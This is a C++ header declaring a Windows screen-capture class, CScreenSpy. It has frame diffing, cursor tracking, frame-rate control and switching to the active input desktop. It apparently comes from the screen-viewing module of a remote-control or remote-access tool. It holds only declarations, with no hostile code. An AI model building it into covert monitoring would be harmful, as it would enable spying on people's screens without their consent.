#pragma once
#include <windows.h>
#include "CursorInfo.h"


class CScreenSpy
{
public:
	CScreenSpy(int biBitCount = 8, bool bIsGray = false, UINT nMaxFrameRate = 1);
	virtual ~CScreenSpy();
	LPVOID getFirstScreen();
	LPVOID getNextScreen(LPDWORD lpdwBytes);
	LPBITMAPINFO getBI();
	UINT	getBISize();
	UINT	getFirstImageSize();
	void	setCaptureLayer(bool bIsCaptureLayer);
	bool SwitchInputDesktop();

public:
	UINT m_nMaxFrameRate;
	bool m_bIsGray;
	DWORD m_dwBitBltRop;
	LPBYTE m_rectBuffer;
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int m_nFullWidth, m_nFullHeight, m_nStartLine;
	float	fDpiRatio;  //DPI
	RECT m_changeRect;
	HDC m_hFullDC, m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
	int	m_biBitCount;
	int	m_nDataSizePerLine;

	LPVOID m_lpvDiffBits; // 差异比较的下一张
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;

	CCursorInfo	m_CursorInfo;
	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // 降低CPU
	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
	void WriteRectBuffer(LPBYTE	lpData, int nCount);
	bool ScanChangedRect(int nStartLine);
	void CopyRect(LPRECT lpRect);
	bool SelectInputWinStation();
	void SetFps(int nfps);
	HWND m_hDeskTopWnd;
	int iScreenX;//获取桌面x坐标
	int iScreenY;//获取桌面y坐标

	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
};
